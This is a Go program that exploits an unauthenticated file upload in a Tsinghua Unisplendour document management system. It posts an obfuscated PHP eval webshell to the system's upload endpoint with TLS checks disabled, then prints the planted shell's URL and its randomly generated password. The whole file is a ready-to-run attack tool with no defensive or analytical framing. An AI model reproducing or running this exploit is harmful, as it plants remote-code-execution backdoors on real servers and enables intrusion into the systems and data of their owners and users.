package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"github.com/hpifu/go-kit/hflag"
	"github.com/liushuochen/gotable"
	"github.com/thanhpk/randstr"
	"github.com/tidwall/gjson"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"strings"
	"time"
)

var Headers = map[string]string{
	"User-Agent":      "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
	"Connection":      "close",
	"Content-Length":  "554",
	"Accept":          "application/json, text/javascript, */*; q=0.01",
	"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6",
}

func main() {
	host := getFlag()
	buffers, password, types := fromData()
	sender(host, buffers, password, types)
}
func fromData() (buffers, password, strType string) {
	webshell, password := shell()
	data := make(textproto.MIMEHeader)
	data.Set("Content-Disposition", " form-data; name=\"files[]\"; filename=\"qaxnb.php\"")
	buffer := &bytes.Buffer{}
	writer := multipart.NewWriter(buffer)
	_ = writer.WriteField("userID", "admin")
	_ = writer.WriteField("fondsid", "1")
	_ = writer.WriteField("comid", "1")
	_ = writer.WriteField("token", "1")
	contentType := writer.FormDataContentType()
	part, _ := writer.CreatePart(data)
	_, _ = part.Write([]byte(webshell))
	_ = writer.Close()
	return buffer.String(), password, contentType
}

func shell() (shell, password string) {
	shellStr := "<?php class Gzgmdb5p { public function __construct($H5j6N){ @eval(\"/*ZVc620s5nx*/\".$H5j6N.\"/*ZVc620s5nx*/\"); }}new Gzgmdb5p($_REQUEST['xcxcxc']);?>"
	pass := randstr.Hex(8)
	shellStr = strings.Replace(shellStr, "xcxcxc", pass, 1)
	return shellStr, pass
}

func cli() *http.Client {
	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		Timeout:   time.Second * 10,
	}
	return client
}

func sender(target, data, pass, types string) {
	targets := strings.Replace(target+"/System/Cms/upload.html?token=", "//System/", "/System/", 1)
	request, _ := http.NewRequest(http.MethodPost, targets, strings.NewReader(data))
	for k, v := range Headers {
		request.Header.Set(k, v)
	}
	request.Header.Set("Content-Type", types)
	client := cli()
	req, _ := client.Do(request)
	if req.StatusCode != http.StatusOK {
		fmt.Println("Sender Error")
	}
	all, _ := ioutil.ReadAll(req.Body)
	result := fmt.Sprintf("%s", all)

	get := gjson.Get(result, "info")
	replace := strings.Replace(get.String(), "{\"0\":{", "{", 1)
	replace = strings.Replace(replace, "\"}}", "\"}", 1)
	if sts := gjson.Get(replace, "name"); sts.String() == "qaxnb.php" {
		filename := gjson.Get(replace, "savename")
		filepath := gjson.Get(replace, "savepath")
		tbl, _ := gotable.Create("ShellAddr", "ShellPass")
		shellurl := strings.Replace(target+"/uploads", "//uploads", "/uploads", 1) + filepath.String() + filename.String()
		_ = tbl.AddRow([]string{
			shellurl, pass,
		})
		fmt.Println(tbl)
		return
	} else {
		log.Println("漏洞都被修复了，还上传个锤子啊")
		return
	}

}

func getFlag() string {
	hflag.AddFlag("target", "清华紫光文档系统地址", hflag.Required(), hflag.Shorthand("t"))
	if err := hflag.Parse(); err != nil {
		fmt.Println(hflag.Usage())
		os.Exit(0)
	}
	return hflag.GetString("target")
}
